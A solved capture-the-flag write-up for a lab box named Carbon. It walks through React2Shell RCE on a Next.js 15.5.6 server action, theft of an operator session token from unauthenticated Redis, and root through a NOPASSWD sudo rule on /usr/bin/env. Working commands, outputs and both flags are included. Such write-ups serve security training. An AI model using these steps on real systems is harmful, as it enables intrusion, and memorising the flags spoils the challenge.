# Carbon — SOLVED (author) 2026-11-14

Target: http://10.83.5.73:3000/portal (fullpwn, difficulty 1)
Box: k8s pod `carbon-5cddcd57cb-bxjv4`, kernel `4.19.0-gvisor` (gVisor sandbox)

## FLAGS
- user: `PP{c4rb0n_c4ch3d_s3ss10n_r3pl4y::oxVLsVhhGUOQ}` (/home/operator/user.txt)
- root: `PP{0p3r4t0r_3nv_1s_r00t::oh5K0X2KtiAP}` (/root/root.txt)

## Chain
1. **Foothold — React2Shell (CVE-2025-66478 / CVE-2025-55182).**
 Portal is Next.js **15.5.6** (package.json) + React 19.2.0, App Router with a
 server action `queueEmissionsReport` (id `60f4f9bc7abe671ede01b0b6a7e45bdb2985d7ec33`).
 Version < 15.5.7 → vulnerable. Detection: POST any route with `Next-Action: x`
 and a crafted multipart → HTTP 500 body `E{"digest":...}`.
 Public toolkit: https://github.com/freeqaz/react2shell
 `./detect.sh http://10.83.5.73:3000/portal` → VULNERABLE.
 `./exploit-redirect.sh http://10.83.5.73:3000/portal "id"` → `uid=1001(nextjs) gid=1001(nextjs)`.
 The report form (account/quarter/kind) is NOT the bug — all three fields are
 sanitised by split-on-`;` (`PF-123456;id` queues only for `PF-123456`), so no
 command injection there. The RSC deserialisation bug is the real door.
 My robust runner that JSON-escapes the payload and tolerates non-zero exit:
 `work/rce.sh <url> '<cmd>'` (double quotes in the command are the trap —
 they must be JSON-escaped or the Flight payload breaks).

2. **nextjs → operator.** `/entrypoint.sh` (world-readable) shows the operator OS
 password = `sha256("carbon-operator:"+FLAG_USER)[:24]`, and points at
 `/opt/carbon/ops-notes.md` (0644). ops-notes says the operator password is only
 handed out by the internal admin API to a caller holding the operator session.
 The ops dashboard keeps that session token in **Redis 127.0.0.1:6379 (no auth)**,
 key `session:operator` (short TTL, dashboard refreshes it):
 ```
 T=$(redis-cli -h 127.0.0.1 -p 6379 GET session:operator) # e.g. DIpRyjE4PI-CD57HkiXT-CFCPVeIx8CX
 curl -s -H "Authorization: Bearer $T" http://127.0.0.1:9000/admin/operator-credential
 # -> 433c41611683e1a345c3276b
 printf '433c41611683e1a345c3276b\n' | su operator -c 'cat /home/operator/user.txt'
 ```
 user flag.
 (`.env.local` is a decoy — the DB URL is dead/rotated, creds masked.)

3. **operator → root.** `sudo -l`:
 ```
 (root) NOPASSWD: /usr/bin/env
 ```
 GTFOBins: `sudo -n /usr/bin/env bash -c 'cat /root/root.txt'` → `uid=0(root)`.
 (ops-notes TODO: "drop the temporary sudo rule for operator once the env check
 script exists" — the leftover rule is the bug.)

## Artifacts
- `work/rce.sh` — reusable React2Shell exec runner
- `work/react2shell/` — cloned freeqaz/react2shell toolkit
- `work/post.sh` — server-action form poster (used for the `;` sanitisation proof)
